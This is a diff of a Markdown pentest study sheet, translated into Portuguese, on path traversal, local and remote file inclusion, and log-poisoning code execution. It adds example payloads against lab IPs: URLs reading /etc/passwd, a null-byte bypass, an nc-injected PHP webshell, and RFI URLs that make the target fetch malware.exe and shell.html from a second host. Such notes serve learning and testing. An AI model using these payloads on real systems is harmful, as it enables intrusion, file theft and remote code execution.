@@ -1,12 +1,19 @@
 # Full Path Disclosure | Path Traversal | Directory Traversal
-Path Traversal or Directory Traversal is a vulnerability that occurs when it is possible to navigate between directories through a GET parameter through the URL using the ".. /" to list all previous directories. Through this vulnerability, it is possible to find sensitive files that, if placed in the URL, can see their contents and find confidential information
+Path Traversal ou Directory Traversal é uma vulnerabilidade que ocorre quando é possível navegar entre diretórios através de um parâmetro GET na URL usando o comando "../" para listar todos os diretórios anteriores. Através dessa vulnerabilidade, é possível encontrar arquivos sensíveis que, se colocados na URL, podem visualizar seu conteúdo e encontrar informações confidenciais.
+
+Exemplo: http://172.16.1.10/turismo/logado.php?banners=../../../../../../../etc/passwd
 ## Local File Inclusion (LFI)
-Local File Inclusion occurs when the user is able to include and execute local files on the server, manipulating the parameters of the request to include malicious files in the application code. In code that adds a file extension to the end of the request, it is possible to circumvent it by adding a nullbyte (%00) to the end of the request.
+Local File Inclusion ocorre quando o usuário consegue incluir e executar arquivos locais no servidor, manipulando os parâmetros da solicitação para incluir arquivos maliciosos no código do aplicativo. Em códigos que adicionam uma extensão de arquivo ao final da solicitação, é possível contornar isso adicionando um byte nulo (%00) ao final da solicitação.
 
+Exemplo: http://172.16.1.231/index.php?page=../../../../../../../etc/passwd%00
 ### Remote Code Execution através de LFI
-Remote code injection through the server logs file is possible if the server interprets the code passed to the log. In the following example, the code calls the system function and through the GET parameter, executes the parameter-passed code remotely on the server.
+Remote code injection através do arquivo de logs do servidor (/var/log/apachje2/access.log) é possível se o servidor interpretar o código passado para o log. No exemplo a seguir, o código chama a função do sistema e, por meio do parâmetro GET, executa o código passado remotamente no servidor.
 
-PHP Code Example: `<?php system($_GET['parameter']); ?>`
+Código para enviar ao servidor: `nc -v 172.16.1.10 80 -C` -> Código PHP
+Código PHP: `<?php system($_GET['parameter']); ?>`
 
 ## Remote File Inclusion (RFI)
-Remote File Inclusion occurs when the server executes code remotely from another server, so it is possible to upload a server and send malicious code to the server, to execute code remotely through a parameter, just like in RCE through LFI
+Remote File Inclusion ocorre quando o servidor executa código remotamente de outro servidor, então é possível fazer upload de um servidor e enviar código malicioso para o servidor, para executar código remotamente por meio de um parâmetro, assim como no RCE por meio de LFI
+
+Exemplo: http://172.16.1.10/turismo/link.php?link=http://172.16.1.30:8080/malware.exe
+Exemplo: http://172.16.1.10/turismo/link.php?link=http://172.16.1.30:8080/shell.html&hack=id
